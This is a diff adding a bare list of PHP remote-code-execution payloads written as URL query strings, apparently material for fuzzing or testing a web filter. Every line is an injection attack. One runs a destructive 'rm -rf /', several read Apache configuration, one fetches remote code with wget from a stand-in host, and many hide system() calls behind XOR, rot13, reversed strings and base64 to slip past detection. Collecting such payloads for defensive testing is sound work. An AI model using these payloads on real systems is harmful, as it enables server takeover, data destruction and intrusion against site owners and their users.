@@ -1,0 +1,16 @@
+?rce0=;phpinfo()
+?rce1=;@phpinfo()/**/
+?rce2="; <?php exec("rm -rf /"); ?>
+?rce3=; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');
+?rce4=;echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))
+?rce5="; $_a=(! \'a\') . "php"; $_a.=(! \'a\') . "info"; $_a(1); $b="
+?rce6=";define(_a,"0008avwga000934mm40re8n5n3aahgqvaga0a303");if(!0)$c=USXWATKXACICMVYEIkw71cLTLnHZHXOTAYADOCXC^_a;if(!0)system($c);//
+?rce7=";if (!0) $_a ="". str_rot13(\'cevags\');$_b = HTTP_USER_AGENT;$_c="". $_SERVER[$_b];$_a( `$_c` );//
+?rce8=";$_c = "" . $_a($b);$_b(`$_c`);//
+?rce9=" ;if  (!0) $_a = base64_decode ;if(!0)$_b=parse_str ;$_c= "" .strrev("ftnirp");if(!0)$_d = QUERY_STRING;$_e= "" . $_SERVER[$_d];$_b($_e);$_f = "" . $_a($b);$_c(`$_f`);//
+?rcea=";{if (!($_b[]++%1)) $_a[]  = system;$_a[0]( "ls"); } //
+?rceb=";;if (!($_b[]  %1)) $_a[0]  = system;$_a[0](!a. "ls");  //
+?rcec=; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//
+?rced=aaaa { $ {`wget hxxp://example.com/x.php`}}
+?rcee=";{ if (true) $_a  = "" . strtolower("pass");if   (1) $_a.= "" . strtolower("thru");$_a( "dir"); } //
+?rcef=";$_y = "" . strrev("ftnirp");if  (!0)    $_a = base64_decode ;if  (!0)    $_b="" . $_a(\'cHdk\');if (!0) $_y(`$_b`);//
